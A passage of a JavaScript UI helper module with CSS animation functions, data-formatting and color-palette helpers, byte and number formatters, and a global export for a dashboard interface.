        if (progress < 1) requestAnimationFrame(animate);
      };
      requestAnimationFrame(animate);
    },

    pulse: function(element, color = '#0ec77d') {
      element.style.animation = 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite';
      element.style.boxShadow = `0 0 0 0 ${color}`;
    },

    slideInRight: function(element) {
      element.style.animation = 'slideInRight 0.3s var(--ease-out)';
    },

    shake: function(element) {
      element.style.animation = 'shake 0.4s cubic-bezier(.36,.07,.19,.97) both';
      if (!document.getElementById('shake-keyframes')) {
        const style = document.createElement('style');
        style.id = 'shake-keyframes';
        style.textContent = `
          @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
          }
        `;
        document.head.appendChild(style);
      }
    }
  },

  // ============================================================
  // DATA VISUALIZATION HELPERS
  // ============================================================
  
  viz: {
    formatBytesColored: function(bytes) {
      const fmt = fmtBytes(bytes);
      const color = bytes > 1e9 ? 'text-acc-rose' : bytes > 1e6 ? 'text-chaos-400' : 'text-acc-emerald';
      return `<span class="font-mono ${color}">${fmt}</span>`;
    },

    formatNumberAbbr: function(num) {
      if (num >= 1e9) return (num / 1e9).toFixed(1) + 'B';
      if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
      if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
      return num.toString();
    },

    generateGradient: function(ctx, colorStops) {
      const gradient = ctx.createLinearGradient(0, 0, 0, 400);
      colorStops.forEach(([offset, color]) => gradient.addColorStop(offset, color));
      return gradient;
    },

    getPalette: function(count, theme = 'chaos') {
      const palettes = {
        chaos: ['#e6731d', '#0ec77d', '#0ea5e9', '#8b5cf6', '#f43f5e', '#06b6d4', '#f59e0b', '#ec4899'],
        matrix: ['#0ec77d', '#00cc55', '#00aa44', '#008833', '#006622', '#00e5aa', '#00e5bb', '#00e5cc'],
        midnight: ['#3b82f6', '#22c55e', '#06b6d4', '#a855f7', '#ec4899', '#f59e0b', '#ef4444', '#14b8a6'],
        blood: ['#dc2626', '#ef4444', '#f97316', '#fbbf24', '#22c55e', '#06b6d4', '#a855f7', '#ec4899'],
        mono: ['#e8e8e8', '#d4d4d4', '#a3a3a3', '#737373', '#525252', '#404040', '#262626', '#171717']
      };
      const palette = palettes[theme] || palettes.chaos;
      return Array.from({length: count}, (_, i) => palette[i % palette.length]);
    }
  }
};

// Helper functions
function getColorHex(name) {
  const colors = {
    chaos: '#e6731d', success: '#0ec77d', warning: '#f59e0b', danger: '#f43f5e',
    info: '#0ea5e9', violet: '#8b5cf6', cyan: '#06b6d4'
  };
  return colors[name] || colors.chaos;
}

function fmtBytes(bytes) {
  if (!bytes || bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`;
}

function fmtNumber(n) {
  return (n ?? 0).toLocaleString();
}

// Initialize sparklines on DOM ready
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('canvas[data-sparkline]').forEach(canvas => {
    const data = JSON.parse(canvas.dataset.sparkline);
    // rendered via MetricCard
  });
});

// Make available globally
window.EnhancedUI = EnhancedUI;